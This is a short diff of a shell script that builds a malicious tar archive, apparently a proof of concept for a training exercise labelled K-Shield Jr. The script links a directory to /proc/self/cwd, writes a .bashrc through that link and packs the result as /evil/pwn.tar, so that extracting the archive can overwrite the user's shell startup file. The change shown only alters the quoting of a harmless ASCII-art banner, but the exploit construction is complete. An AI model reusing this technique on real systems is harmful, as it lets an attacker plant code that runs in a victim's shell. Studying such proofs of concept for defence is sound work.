@@ -10,20 +10,20 @@ cd badbash
 ln -s /proc/self/cwd k8s-master
 cd k8s-master
 cat<<EOF > .bashrc
-echo " _____________________"
-echo "< Hello K-Shield Jr. 2>"
-echo " --------------------- "
-echo "  \\"
-echo "   \\"
-echo "    \\ "
-echo "                    ##        ."
-echo "              ## ## ##       =="
-echo "           ## ## ## ##      ==="
-echo "       /""""""""""""""""___/ ==="        
-echo "  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~"   
-echo "       \______ o          __/"            
-echo "        \    \        __/ "            
-echo "          \____\______/   "
+echo ' _____________________'
+echo '< Hello K-Shield Jr. 2>'
+echo ' --------------------- '
+echo '  \\'
+echo '   \\'
+echo '    \\'
+echo '                    ##        .'
+echo '              ## ## ##       =='
+echo '           ## ## ## ##      ==='
+echo '       /""""""""""""""""___/ ==='        
+echo '  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~'
+echo '       \______ o          __/' 
+echo '        \    \        __/ '         
+echo '          \____\______/   '
 EOF
 cd /evil
 tar -cf pwn.tar badbash/
